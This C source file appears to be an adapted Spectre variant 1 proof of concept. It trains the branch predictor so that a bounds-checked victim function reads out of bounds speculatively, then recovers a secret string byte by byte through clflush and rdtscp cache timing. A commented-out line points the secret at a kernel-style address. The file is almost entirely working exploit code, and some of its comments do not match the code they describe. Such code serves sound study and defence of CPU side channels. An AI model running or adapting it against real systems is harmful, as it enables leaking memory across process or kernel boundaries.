#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
uint8_t array[16] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t mem_pages[256][512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t index) {
    _mm_clflush(array);
    for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
    
    if (index < 16) {//no secret here, but make the secret have more opportunity to run here in speculate execute mode
        temp = mem_pages[array[index]][0];
    }

    //printf("%p, ", &array[index]);
}

#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(char* secret, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    size_t offset_to_array=(size_t)(secret-(char*)array);

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 0; tries < 999; tries++) {

        /* Flush mem_pages[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(mem_pages[i]); /* intrinsic for clflush instruction */

        size_t training_x, index;
        training_x = tries % sizeof(array);
        for (j = 0; j < 30; j++) {
            index = ((j % (sizeof(array)/2)) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            index = (index | (index >> sizeof(array))); /* Set x=-1 if j&6=0, else x=0 */
            index = training_x ^ (index & (offset_to_array ^ training_x));
            victim_function(index);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = mem_pages[mix_i];
            time1 = __rdtscp(&junk); /* READ TIMER */
            junk = *addr; /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD)
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv) {
    int i, score[2], len=40;
    uint8_t value[2];

    for (i = 0; i < sizeof(mem_pages); i++)
        mem_pages[0][i] = 1; /* write to mem_pages so in RAM not copy-on-write zero pages */
    
    //printf("secret = %p,", secret);
    //secret = 0xffffffff8182da70;
    while (--len >= 0) 
    {
        readMemoryByte(secret++, value, score);
        printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
        printf("%c score=%d ", value[0], score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
    }
    return (0);
}
